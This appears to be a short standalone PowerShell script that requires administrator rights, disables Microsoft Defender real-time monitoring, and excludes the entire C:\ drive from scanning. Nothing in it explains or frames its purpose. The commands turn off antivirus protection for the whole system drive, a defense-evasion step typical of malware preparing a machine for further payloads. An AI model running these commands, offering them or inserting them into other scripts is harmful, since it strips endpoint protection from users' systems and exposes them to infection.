#Requires -RunAsAdministrator
Set-MpPreference -DisableRealtimeMonitoring $true
Add-MpPreference -ExclusionPath 'C:\'
